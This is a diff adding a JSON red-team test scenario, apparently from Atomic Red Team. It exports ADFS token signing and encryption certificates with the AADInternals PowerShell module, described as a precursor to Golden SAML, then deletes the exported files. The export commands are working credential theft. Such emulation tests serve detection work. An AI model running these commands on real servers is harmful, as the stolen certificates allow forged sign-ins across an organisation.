@@ -1,0 +1,97 @@
+{
+  "id": "78e95057-d429-4e66-8f82-0f060c1ac96f",
+  "name": "ADFS token signing and encryption certificates theft - Local",
+  "description": "Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as Administrator on an ADFS server.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "a63aba5c-d938-403e-afae-fde922db7fc6",
+      "type": "execute-command",
+      "data": {
+        "command": "Import-Module AADInternals -Force\nExport-AADIntADFSCertificates\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "988f110a-08e2-4c57-83bd-e5b59bb56c2c",
+      "type": "execute-command",
+      "data": {
+        "command": "Remove-Item -Path \".\\ADFS_encryption.pfx\" -ErrorAction Ignore\nRemove-Item -Path \".\\ADFS_signing.pfx\" -ErrorAction Ignore\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "b265e913-dad5-4d9e-904f-cc3f193b3596",
+      "name": "Check dependency 1/1",
+      "description": "AADInternals module must be installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Get-Module AADInternals) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "101cade5-0af8-49fe-9b00-39a8b8f71521",
+      "name": "Resolve dependency 1/1",
+      "description": "AADInternals module must be installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Install-Module -Name AADInternals -Force\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "ca437cac-dfe9-487e-ad63-a42e1b0adc0b",
+      "name": "Re-check dependency 1/1",
+      "description": "AADInternals module must be installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Get-Module AADInternals) {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "a63aba5c-d938-403e-afae-fde922db7fc6",
+      "p": "on-success",
+      "o": "988f110a-08e2-4c57-83bd-e5b59bb56c2c"
+    },
+    {
+      "s": "a63aba5c-d938-403e-afae-fde922db7fc6",
+      "p": "on-failure",
+      "o": "988f110a-08e2-4c57-83bd-e5b59bb56c2c"
+    },
+    {
+      "s": "b265e913-dad5-4d9e-904f-cc3f193b3596",
+      "p": "on-success",
+      "o": "a63aba5c-d938-403e-afae-fde922db7fc6"
+    },
+    {
+      "s": "b265e913-dad5-4d9e-904f-cc3f193b3596",
+      "p": "on-failure",
+      "o": "101cade5-0af8-49fe-9b00-39a8b8f71521"
+    },
+    {
+      "s": "101cade5-0af8-49fe-9b00-39a8b8f71521",
+      "p": "on-success",
+      "o": "ca437cac-dfe9-487e-ad63-a42e1b0adc0b"
+    },
+    {
+      "s": "ca437cac-dfe9-487e-ad63-a42e1b0adc0b",
+      "p": "on-failure",
+      "o": "a63aba5c-d938-403e-afae-fde922db7fc6"
+    }
+  ],
+  "tags": [
+    "T1552.004",
+    "atomic-red-team"
+  ]
+}
